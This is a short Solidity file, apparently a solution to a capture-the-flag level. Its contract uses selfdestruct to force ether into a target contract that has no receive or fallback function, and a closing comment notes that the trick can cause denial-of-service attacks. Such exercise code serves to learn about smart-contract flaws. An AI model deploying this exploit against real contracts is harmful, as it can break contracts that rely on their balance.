// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface Force {}

contract forceAttack {
   Force public target;

   constructor(address _target){
       target=Force(payable(_target));
   }
   function attack() public payable{
       address payable vulnerable=payable(address(target));
       selfdestruct(vulnerable);

   }
}


/*self-destruct is used tp forcefully send ether to a contract without receive/fallback functions. Can be used to cause DOS attacks  */